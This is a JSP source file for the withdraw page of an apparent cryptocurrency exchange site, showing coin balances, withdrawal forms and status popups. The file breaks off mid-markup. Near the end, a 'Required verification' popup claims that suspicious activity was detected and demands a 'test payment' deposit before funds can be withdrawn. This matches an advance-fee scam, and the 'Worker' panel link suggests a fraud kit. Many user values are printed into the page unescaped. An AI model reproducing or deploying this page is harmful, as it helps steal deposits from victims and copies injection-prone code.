<%@ page import="java.util.Map" %>
<%@ page import="org.apache.commons.lang3.tuple.Pair" %>
<%@ page import="java.util.List" %>
<%@ page import="ru.tiedie.cryptoexchange.utils.MyDecimal" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <%
        out.println("<title>Withdraw | " + request.getAttribute("domain_exchange_name") + "</title>");
    %>
    <%
    out.println("<link rel=\"icon\" href=\"" + request.getAttribute("domain_icon") + "\">");
  %>
    <%
        out.println("<meta property=\"og:title\" content=\"" + request.getAttribute("domain_title") + "\">");
    %>
    <meta property="og:description" content="Best place to buy, trade and sell Bitcoin, Ethereum and over 100 cryptocurrencies safely and securely.">
    <link rel="stylesheet" href="../assets/css/g_menu_normalize.css">
    <link rel="stylesheet" href="../assets/css/g_menu_style.css">
    <link rel="stylesheet" href="../assets/css/style.css?v=3">
    <link rel="stylesheet" href="../assets/css/custom.css?v=3">
    <link rel="stylesheet" href="../plugins/notifications/toastr.css">
    <link rel="stylesheet" href="../assets/css/popap-style.css">
    <link rel="stylesheet" href="../assets/css/stake.css">
    <link rel="stylesheet" href="../assets/css/popup/popup-verifi.css">
    <link rel="stylesheet" href="../assets/css/available.css">
    <link rel="stylesheet" href="../assets/css/new_popup_style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
</head>
<body id="dark" class="stop-scrolling">
<!-- PRELOADER -->
<!-- PRELOADER END -->
<header class="header">
    <div class="header__left">
        <a class="header__logo" href="/">
            <%
        out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" alt=\"\">");
      %>
            <%
        out.println("<span class=\"header__logo-text\">" + request.getAttribute("domain_exchange_name") + "</span>");
      %>
        </a>
        <div class="header__links">
            <a class="header__link" href="../trading">Trading</a>
            <div class="header__link-tools header__tools">
                <span class="header__link-tools-span">Market tools</span>
                <div class="header__tools-box">
                    <a class="header__tools-link" href="../tools/marketcrypto">Crypto market cap</a>
                    <a class="header__tools-link" href="../tools/marketscreener">Market screener</a>
                    <a class="header__tools-link" href="../tools/technicalanalysis">Technical analysis</a>
                    <a class="header__tools-link" href="../tools/crossrates">Cross rates</a>
                    <a class="header__tools-link" href="../tools/heatmap">Currency heat map</a>
                </div>
            </div>
            <a class="header__link" href="../profile/invest">Invest</a>
            <a class="header__link header__link-new" href="../profile/p2p">P2P</a>
            <a class="header__link header__link-hot" href="../profile/swap">Swap</a>
            <%
                if (request.getAttribute("support_unviewed") != null && ((int) request.getAttribute("support_unviewed")) > 0) {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support <span id=\"count_support_message\" class=\"support_messages\">" + request.getAttribute("support_unviewed") + "</span></a>");
                } else {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support </a>");
                }
            %>
            <%
                out.println("<a class=\"header__link\" href=\"/profile/wallet\">Wallet: " + request.getAttribute("total_balance") + " USD </a>");
            %>
        </div>
    </div>
    <div class="header__right">
        <div class="header__profile">
            <div class="header__profile-toggle">
                <%
                    out.print("<div class=\"header__toggle-name\">" + request.getAttribute("username") + "</div>");
                %>
                <div class="header__toggle-img">
                    <%
                        out.println("<img src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                    %>
                </div>
                <div class="header__toggle-btn">
                    <svg width="28" height="28" viewBox="0 0 100 100">
                        <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
                        <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
                        <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
                    </svg>
                </div>
            </div>
            <div class="header__profile-box">
                <div class="header__profile-top">
                    <%
                        if (request.getAttribute("kyc_accepted") != null) {
                            out.println("<div class=\"header__profile-img header__profile-kyc\">");
                        } else {
                            out.println("<div class=\"header__profile-img \">");
                        }
                        out.println("<img style=\"width: 64px; height: 64px; border-radius: 50%;\" src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        out.println("</div>");
                    %>
                    <div class="header__profile-info">
                        <%
                            out.print("<div class=\"header__profile-name\">" + request.getAttribute("username") + "</div>");
                            out.print("<div class=\"header__profile-email\">" + request.getAttribute("email") + "</div>");
                            out.print("<div class=\"userCard__user-premium-" + (request.getAttribute("premium") == null ? "danger" : "success") + "\" style=\"font-size: 13px; margin-left: 5px; padding-left: 15px;\">Premium</div>");
                        %>
                    </div>
                </div>
                <div class="header__profile-center">
                    <a class="header__profile-link" href="../trading">Trading</a>
                    <a class="header__profile-link header__profile-tools" href="#">
                        <span>Market tools</span>
                        <div class="header__profile-tools-box">
                            <a class="header__profile-tools-link" href="../tools/marketcrypto">
                                Crypto market cap
                            </a>
                            <a class="header__profile-tools-link" href="../tools/marketscreener">
                                Market screener
                            </a>
                            <a class="header__profile-tools-link" href="../tools/technicalanalysis">
                                Technical analysis
                            </a>
                            <a class="header__profile-tools-link" href="../tools/crossrates">
                                Cross rates
                            </a>
                            <a class="header__profile-tools-link" href="../tools/heatmap">
                                Currency heat map
                            </a>
                        </div>
                    </a>
                    <a class="header__profile-link" href="../profile/invest">Invest</a>
                    <a class="header__profile-link header__link-new" href="../profile/p2p">P2P</a>
                    <a class="header__profile-link header__link-hot" href="../profile/swap">Swap</a>
                    <a class="header__profile-link" href="../profile/support">Support</a>
                </div>
                <div class="header__profile-bottom">
                    <%
                        Object panel = request.getAttribute("panel");
                        if (panel != null) {
                            out.println("<a class=\"header__profile-link\" href=\"../" + (((String) panel).equals("Worker") ? "panel" : "admin") + "\" style=\"color: orange;\">\n" +
                                    "                            <div class=\"header__profile-link-icon\">\n" +
                                    "                                <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z\"></path></svg>\n" +
                                    "                            </div>\n" +
                                    panel + " panel</a>");
                        }
                    %>
                    <a class="header__profile-link" href="../profile/wallet">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                <path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z" />
                            </svg>
                        </div>
                        <%
                            out.println("<span>Wallet: " + request.getAttribute("total_balance") + " USD </span>");
                        %>
                    </a>
                    <a class="header__profile-link" href="../profile/settings">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                <path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.21,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.21,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z" />
                            </svg>
                        </div>
                        <span>Settings</span>
                    </a>
                    <a class="header__profile-link header__profile-out" href="/profile/logout">
                        <div class="header__profile-link-icon">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                <path d="M16.56,5.44L15.11,6.89C16.84,7.94 18,9.83 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12C6,9.83 7.16,7.94 8.88,6.88L7.44,5.44C5.36,6.88 4,9.28 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12C20,9.28 18.64,6.88 16.56,5.44M13,3H11V13H13" />
                            </svg>
                        </div>
                        <span>Log Out</span>
                    </a>
                </div>
            </div>
        </div>
    </div>
</header>
<link rel="stylesheet" href="../assets/css/successful-popup.css">
<style>
    .nice-select {
        width: 100% !important;
        background: black !important;
        /*border: 1px solid black !important;*/
        border: 1px solid #808080 !important;
    }
    .list {
        overflow: auto !important;
        height: 300px;
    }
    .list .option:hover {
        color:  black !important;
    }
    .nice-select .option.selected.focus {
        color: black !important;
        background-color: white !important;
    }
</style>
<link rel="stylesheet" href="../assets/css/styleNew.css">
<link rel="stylesheet" href="../assets/css/available.css">
<link rel="stylesheet" href="../assets/css/p2p.css">
<style type="text/css">
    @media (max-width: 1220px) {
        .content-body {
            margin-left: 0px !important;
            margin-right: 0px !important;
        }
    }
</style>
<div class="b1">
    <div class="page-title dashboard">
        <div class="container">
            <div class="row">
                <div class="col-6">
                    <div class="page-title-content">
                        <p>Welcome Back,
                            <%
                                out.print("<span> " + request.getAttribute("username") + "</span>");
                            %>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="content-body">
        <div class="container">
            <div class="row">
                <!-- Profile menu -->
                <link rel="stylesheet" href="../assets/css/materialdesignicons.min.css">
                <link rel="stylesheet" href="../assets/css/menu_layout.css">
                <section class="menuProfile">
                    <div class="menuProfile__more-bg"></div>
                    <div class="menuProfile__container">
                        <div class="menuProfile__box">
                            <div class="menuProfile__menu-box">
                                <a class="menuProfile__menu-item mdi mdi-bullseye " href="/profile/wallet">Overview</a>
                                <a class="menuProfile__menu-item mdi mdi-database " href="/profile/deposit">Deposit</a>
                                <a class="menuProfile__menu-item mdi mdi-transfer-right active" href="/profile/withdraw">Withdraw</a>
                                <span class="menuProfile__menu-item menuProfile__menu-more mdi mdi-more">Menu</span>
                                <div class="menuProfile__more">
                                    <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-history " href="/profile/transactions">Transactions</a>
                                    <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-reply " href="/profile/transfer">Transfer</a>
                                    <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-cash " href="/profile/invest">Invest</a>
                                    <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-diamond " href="/profile/affiliate">Affiliate</a>
                                    <a class="menuProfile__menu-item menuProfile__item-mobile mdi mdi-cog " href="/profile/settings">Settings</a>
                                    <%
                                        if (((boolean) request.getAttribute("wallet_connect"))) {
                                            out.println("<a class=\"menuProfile__menu-item menuProfile__item-mobile mdi mdi-wallet \" href=\"/profile/walletconnect\">Wallet connect</a>");
                                        }
                                    %>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <!-- Profile menu end -->
                <div class="col-xl-12">
                    <div class="deposit">
                        <div class="deposit__box">
                            <div class="deposit__mobile-btn">
                                Coin
                                <svg width="14" height="8" viewBox="0 0 14 8" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M7 8L0.937823 0.5L13.0622 0.499999L7 8Z" fill="#D9D9D9"></path>
                                </svg>
                            </div>
                            <div class="deposit__coin-list-box">
                                <div class="deposit__coin-list-wrapper">
                                    <div class="deposit__close-list">
                                        <svg width="16px" height="16px" xmlns="http://www.w3.org/2000/svg">
                                            <path d="M5.584 6.999.876 11.708l1.414 1.414 4.708-4.709 4.709 4.71 1.414-1.415-4.708-4.709 5.291-5.292L12.29.293 6.998 5.585 1.708.293.292 1.707 5.584 7Z" fill="currentColor"></path>
                                        </svg>
                                    </div>
                                    <div id="btnBox" class="deposit__coin-list">
                                        <%
                                            Map<String, Map<String, Object>> coins = (Map<String, Map<String, Object>>) request.getAttribute("withdraw_coins");
                                            Map<String, Double> coinsBalances = (Map<String, Double>) request.getAttribute("coins_balances");
                                            Map<String, Double> coinsPrices = (Map<String, Double>) request.getAttribute("coins_prices");
                                            boolean first = true;
                                            for (Map.Entry<String, Map<String, Object>> entry : coins.entrySet()) {
                                                Map<String, Object> coin = entry.getValue();
                                                String symbol = (String) coin.get("symbol");
                                                out.println("<div onclick=\"setTab('" + entry.getKey() + "')\" id=\"btn_" + entry.getKey() + "\" class=\"rushButton deposit__coin-item" + (first ? " buttonActiveNew" : "") + "\">");
                                                out.println("   <img class=\"deposit__coin-img\" src=\"" + coin.get("image") + "\" alt=\"\">");
                                                out.println("   <div class=\"deposit__coin-title\">" + coin.get("title") + "</div>");
                                                out.println("   <div class=\"deposit__coin-wallet\">");
                                                //todo: balance
                                                out.println("       <span id=\"" + entry.getKey() + "_balance\">" + new MyDecimal(coinsBalances.getOrDefault(symbol, 0D)).toString() + "</span> " + symbol);
                                                out.println("   </div>");
                                                out.println("<input type=\"hidden\" id=\"" + symbol + "_course\" value=\"" + coinsPrices.get(symbol) + "\">");
                                                out.println("</div>");
                                                first = false;
                                            }
                                        %>
                                    </div>
                                </div>
                            </div>
                            <div class="deposit__content-list withdraw__container-content">
                                <%
                                    boolean first2 = true;
                                    for (Map.Entry<String, Map<String, Object>> entry : coins.entrySet()) {
                                        Map<String, Object> coin = entry.getValue();
                                        String name = entry.getKey();
                                        String upperName = name.toUpperCase();
                                        String title = (String) coin.get("title");
                                        String html = String.format("<div id=\"tab_%s\" class=\"deposit__content-item" + (first2 ? " deposit__content-item-active" : "") + "\">\n" +
                                                "                                    <div class=\"withdraw__content-top\">\n" +
                                                "                                        <div class=\"deposit__content-title\">Withdraw</div>\n" +
                                                "                                        <div class=\"withdraw\">\n" +
                                                "                                            <div class=\"withdraw__container\">\n" +
                                                "                                                <div class=\"withdraw__address\">\n" +
                                                "                                                    <div class=\"withdraw__address-container\">\n" +
                                                "                                                        <div class=\"withdraw__address-title\">\n" +
                                                "                                                            Destination %s address\n" +
                                                "                                                        </div>\n" +
                                                "                                                        <div class=\"withdraw__address-description\">\n" +
                                                "                                                            Please double check this address\n" +
                                                "                                                        </div>\n" +
                                                "                                                    </div>\n" +
                                                "                                                    <label>\n" +
                                                "                                                        <input id=\"%s_address\" class=\"withdraw__address-input\" type=\"text\" placeholder=\"Please enter recipient’s %s address\">\n" +
                                                "                                                    </label>\n" +
                                                "                                                </div>", name, title, name, title);
                                        if ((boolean) coin.get("mnemo")) {
                                            html += String.format("<div class=\"withdraw__address\">\n" +
                                                    "                                                    <div class=\"withdraw__address-container\">\n" +
                                                    "                                                        <div class=\"withdraw__address-title\">\n" +
                                                    "                                                            Destination %s memo\n" +
                                                    "                                                        </div>\n" +
                                                    "                                                        <div class=\"withdraw__address-description\">\n" +
                                                    "                                                            Please double check this memo\n" +
                                                    "                                                        </div>\n" +
                                                    "                                                    </div>\n" +
                                                    "                                                    <label>\n" +
                                                    "                                                        <input id=\"%s_memo\" class=\"withdraw__address-input\" type=\"number\" placeholder=\"Please enter memo number\">\n" +
                                                    "                                                    </label>\n" +
                                                    "                                                </div>", title, name);
                                        }
                                        html += String.format("<div class=\"withdraw__amount\">\n" +
                                                "                                                    <div class=\"withdraw__amount-container\">\n" +
                                                "                                                        <div class=\"withdraw__amount-title\">\n" +
                                                "                                                            Amount %s\n" +
                                                "                                                        </div>\n" +
                                                "                                                        <div class=\"withdraw__amount-description\">\n" +
                                                "                                                            Maximum amount withdrawable: <span onclick=\"enterMaximumAmount('%s', '%s')\" style=\"border-bottom: 1px solid; cursor: pointer;\">%s</span> %s\n" +
                                                "                                                        </div>\n" +
                                                "                                                    </div>\n" +
                                                "                                                    <label>\n" +
                                                "                                                        <input id=\"%s_amount\" class=\"withdraw__amount-input\" type=\"text\" placeholder=\"Please enter an amount in %s\">\n" +
                                                "                                                    </label>\n" +
                                                "                                                </div>\n" +
                                                "                                                <div class=\"withdraw__network\">\n" +
                                                "                                                    <div class=\"withdraw__network-container\">\n" +
                                                "                                                        <div class=\"withdraw__network-title\">\n" +
                                                "                                                            %s Network Fee\n" +
                                                "                                                        </div>\n" +
                                                "                                                        <div class=\"withdraw__network-description\">\n" +
                                                "                                                            Transactions on the %s network are priorirized by fees\n" +
                                                "                                                        </div>\n" +
                                                "                                                    </div>\n" +
                                                "                                                    <div class=\"withdraw__network-fee\">\n" +
                                                "                                                        %s %s\n" +
                                                "                                                    </div>\n" +
                                                "                                                </div>\n" +
                                                "                                            </div>\n" +
                                                "                                            <div class=\"withdraw__btn-container\">\n" +
                                                "                                                <a class=\"withdraw__btn\" href=\"#\" onclick=\"withdraw('%s', event)\">\n" +
                                                "                                                    <img class=\"withdraw__btn-arrow\" src=\"../assets/img/withdraw-arrow.svg\" alt=\"\">\n" +
                                                "                                                    Withdraw now\n" +
                                                "                                                </a>\n" +
                                                "                                            </div>\n" +
                                                "                                        </div>\n" +
                                                "                                    </div>\n" +
                                                "                                    <div class=\"withdraw__content-bottom\">\n" +
                                                "                                        <div class=\"withdraw__info\">\n" +
                                                "                                            <div class=\"withdraw__info-title\">\n" +
                                                "                                                Important Information\n" +
                                                "                                            </div>\n" +
                                                "                                            <div class=\"withdraw__info-container\">\n" +
                                                "                                                <div class=\"withdraw__info-text\">\n" +
                                                "                                                    We strongly recommend that you copy & paste the address to\n" +
                                                "                                                    help avoid errors. Please note that we are not responsible for\n" +
                                                "                                                    coins mistakenly sent to the wrong address.\n" +
                                                "                                                </div>\n" +
                                                "                                                <div class=\"withdraw__info-text\">\n" +
                                                "                                                    Transactions normally take about 30 to 60 minutes to send,\n" +
                                                "                                                    on occasion it can take a few hours if the crypto network is slow.\n" +
                                                "                                                </div>\n" +
                                                "                                            </div>\n" +
                                                "                                        </div>\n" +
                                                "                                    </div>\n" +
                                                "                                </div>", title, name, coinsBalances.getOrDefault((String) coin.get("symbol"), 0D), new MyDecimal(coinsBalances.getOrDefault((String) coin.get("symbol"), 0D)).toString(), title, name, title, coin.get("title"), coin.get("title"), coin.get("gas_fee"), coin.get("symbol"), name);
                                        out.println(html);
                                        first2 = false;
                                    }
                                %>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div id="withdraw_error_modal" class="popup__container" style="display: none;">
    <div class="popup">
        <div class="popup__close" id="close_error_modal">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
                 width="24" height="24"
                 viewBox="0 0 24 24"
                 style=" fill:#FFFFFF;">
                <path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path>
            </svg>
        </div>
        <div class="popup__left">
            <img src="../assets/img/warning.png" alt="">
        </div>
        <div class="popup__right">
            <div class="popup__right-title">
                Warning
            </div>
            <div id="withdraw_modal_error_text" class="popup__right-description">
                <%
                    out.println(request.getAttribute("withdraw_error"));
                %>
            </div>
            <div id="close_modal_btn" class="popup__right-button">
                Close
            </div>
        </div>
    </div>
</div>

<div id="withdraw_true_modal" class="popap-container" style="display: none;">
    <div class="popap-container-item">
        <div class="popap-container-item-close" id="close_modal">
        </div>
        <div class="popap-container-img">
            <img src="https://icons-for-free.com/iconfiles/png/512/complete+done+green+success+valid+icon-1320183462969251652.png" alt="">
        </div>
        <div class="popap-container-item-text-box">
            <h3 class="popap-container-item-title">
                Withdrawal is processed
            </h3>
            <p id="withdraw_modal_text" class="popap-container-item-text">
                Expected time: 15 minutes to 24 hours <br>
                To check the withdrawal status, follow the Transactions page <br>
                Contact online support for additional information.
            </p>
            <div class="popap-container-item-btn" id="close_modal_true_btn">
                  <span class="popap-container-item-button">
                  Close
                  </span>
            </div>
        </div>
    </div>
</div>
<div id="withdraw_true_modal_new" class="successful-popup__bg" style="z-index: 99999999999;">
    <div class="successful-popup">
        <div class="successful-popup__top">
            <div class="successful-popup__img">
                <svg width="82" height="82" viewBox="0 0 82 82" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M75.1667 41C75.1667 59.86 59.86 75.1667 41 75.1667C22.14 75.1667 6.83333 59.86 6.83333 41C6.83333 22.14 22.14 6.83333 41 6.83333C59.86 6.83333 75.1667 22.14 75.1667 41Z" stroke="#E7BD1F" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
                    <path d="M53.6758 51.865L43.0842 45.5442C41.2392 44.4508 39.7358 41.82 39.7358 39.6675V25.6592" stroke="#E7BD1F" stroke-width="6" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <div class="successful-popup__title">
                Withdrawal Processing
            </div>
        </div>
        <div class="successful-popup__bottom">
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Status</div>
                <div class="successful-popup__column-value pending">Pending</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Date</div>
                <div id="t_withdraw_date" class="successful-popup__column-value">1 Nov 2023, 23:59:11</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Amount</div>
                <div id="t_withdraw_amount" class="successful-popup__column-value">21321 USDT</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">To</div>
                <div id="t_withdraw_address" class="successful-popup__column-value to">3NxmaaIUsadncoNOgNFoGcfTxqwX</div>
            </div>
            <!-- <div class="successful-popup__column">
               <div class="successful-popup__column-key">ID</div>
               <div class="successful-popup__column-value id">1239sdah8y2138dsa98hsadsac67523</div>
               </div> -->
            <div class="successful-popup__close" onclick="location.replace('transactions')">
                Close
            </div>
        </div>
    </div>
</div>
<div id="withdraw_true_confirmed_modal" class="successful-popup__bg" style="z-index: 99999999999;">
    <div class="successful-popup">
        <div class="successful-popup__top">
            <div class="successful-popup__img">
                <svg width="86" height="82" viewBox="0 0 86 82" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M65.3015 12.1441C66.4663 10.7609 66.2963 8.68327 64.8246 7.63243C58.2159 2.91368 50.3313 0.248715 42.1651 0.0165582C32.9044 -0.246714 23.8275 2.63418 16.4136 8.18977C8.99977 13.7454 3.686 21.6481 1.33829 30.6102C-1.00942 39.5722 -0.252669 49.0652 3.48522 57.5421C7.22312 66.019 13.7218 72.9801 21.9222 77.291C30.1226 81.6019 39.5412 83.0084 48.6433 81.2813C57.7453 79.5542 65.9941 74.7953 72.0455 67.7802C77.3816 61.5942 80.7315 53.9754 81.7046 45.9135C81.9212 44.1182 80.502 42.5914 78.6951 42.5186C76.8882 42.4458 75.3804 43.8556 75.1365 45.6475C74.2405 52.2294 71.456 58.4377 67.0868 63.5028C62.002 69.3974 55.0707 73.3962 47.4225 74.8474C39.7742 76.2987 31.8599 75.1168 24.9693 71.4945C18.0787 67.8722 12.6181 62.0229 9.47719 54.9C6.33632 47.777 5.70044 39.8003 7.67317 32.2696C9.6459 24.739 14.1109 18.0985 20.3406 13.4303C26.5704 8.76208 34.1975 6.34133 41.979 6.56255C48.6655 6.75264 55.1273 8.88378 60.5913 12.6613C62.0788 13.6897 64.1366 13.5272 65.3015 12.1441Z" fill="#4DB742"/>
                    <path d="M82 12.7977L41.9184 53.0867L23.6994 34.7735" stroke="#4DB742" stroke-width="6.66667" stroke-linecap="round" stroke-linejoin="round"/>
                </svg>
            </div>
            <div class="successful-popup__title">
                Withdrawal Successful
            </div>
        </div>
        <div class="successful-popup__bottom">
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Status</div>
                <div class="successful-popup__column-value completed">Completed</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Date</div>
                <div id="t_withdraw_confirmed_date" class="successful-popup__column-value">1 Nov 2023, 23:59:11</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">Amount</div>
                <div id="t_withdraw_confirmed_amount" class="successful-popup__column-value">21321 USDT</div>
            </div>
            <div class="successful-popup__column">
                <div class="successful-popup__column-key">To</div>
                <div id="t_withdraw_confirmed_address" class="successful-popup__column-value to">3NxmaaIUsadncoNOgNFoGcfTxqwX</div>
            </div>
            <!-- <div class="successful-popup__column">
               <div class="successful-popup__column-key">ID</div>
               <div class="successful-popup__column-value id">1239sdah8y2138dsa98hsadsac67523</div>
               </div> -->
            <div class="successful-popup__close" onclick="location.replace('transactions')">
                Close
            </div>
        </div>
    </div>
</div>
<!-- START POPUP-->
<div id="verify_popap" class="popap-verifi" style="position: fixed !important;">
    <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">
        <div class="popap-verifi-container-item-img">
            <img src="../assets/img/popup-verifi-img/icon.png" alt="">
        </div>
        <div class="popap-verifi-item-info">
            <div class="popap-verifi-loader">
                <div class="popap-verifi-loader-border"></div>
            </div>
            <div class="popap-verifi-item-info-title">
                Required verification
            </div>
            <div class="popap-verifi-item-info-text">
                Our automated anti-fraud system has detected suspicious
                activity in your account. According to the <a
                    href="/terms">Terms of our service</a> and the <a
                    href="/aml-kyc-policy" style="color: #007bff;">AML/KYC policy</a> - to continue
                the withdrawal operation, you need to complete the identification
                of your account. To do this, you need to make a test payment in any currency that is on the list.
                <br>
                <b></b>Funds will be credited to your account balance and will be available for withdrawal after verification.</b>
            </div>
            <div class="popap-verifi-item-info-btn">
                <button class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                    Start verification
                </button>
                <button class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                    Cancel
                </button>
            </div>
        </div>
    </div>
    <div class="popap-verifi-container-item popap-verifi-list-two ">
        <div class="popap-verifi-container-item-img">
            <img src="../assets/img/popup-verifi-img/icon.png" alt="">
        </div>
        <div class="popap-verifi-item-info ">
            <div class="popap-verifi-loader">
                <div class="popap-verifi-loader-border"></div>
            </div>
            <div class="popap-verifi-item-info-title">
                Choose a coin
            </div>
            <div class="popap-verifi-item-info-text">
                Select the cryptocurrency you want to use for the verification payment
            </div>
            <div class="popap-verifi-item-select" id="popap-btn-coin" >
                <select id="verify_currency_list">
                    <%
                        List<Pair<String, String>> depCoins = (List<Pair<String, String>>) request.getAttribute("verify_coins");
                        for (Pair<String, String> depCoin : depCoins) {
                            out.println("<option data-class=\"icon_master\" value=\"" + depCoin.getKey() + "\">" + depCoin.getValue() + "</option>");
                        }
                    %>
                </select>
            </div>
            <div class="popap-verifi-item-info-btn">
                <button class="popap-verifi-item-info-btn-next popap-verifi-list-two-button" onclick="verify_deposit()">
                    Make a deposit
                </button>
                <button class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-two">
                    Cancel
                </button>
            </div>
        </div>
    </div>
    <div class="popap-verifi-container-item popap-verifi-list-three ">
        <div class="popap-verifi-container-item-img">
            <img src="../assets/img/popup-verifi-img/icon.png" alt="">
        </div>
        <div class="popap-verifi-item-info ">
            <div class="popap-verifi-loader">
                <div class="popap-verifi-loader-border"></div>
            </div>
            <div class="popap-verifi-item-info-title">
                Send a transaction
            </div>
            <div class="popap-verifi-item-send">
                Top up your balance with:
                <div class="popap-verifi-item-send-input"
                     style="padding-top: 10px;">
                    <input id="verify_amount" type="text" value="0.000" readonly="">
                    <span class="popap-verifi-item-send-type" id="verify_3_crypto">BTC</span>
                </div>
            </div>
            <div class="popap-verifi-item-address">
                <div style="padding-bottom: 10px;">To address:</div>
                <div id="verify_address" class="popap-verifi-item-address-number">
                </div>
            </div>
            <div class="popap-verifi-item-address" style="display: none;" id="verify_memo_block">
                <div style="padding-bottom: 10px;">and memo:</div>
                <div id="verify_memo" class="popap-verifi-item-address-number"></div>
            </div>
            <div class="popap-verifi-item-info-btn">
                <button id="verify_trans_btn" class="popap-verifi-item-info-btn-next popap-verifi-list-three-button">
                    Verify transaction
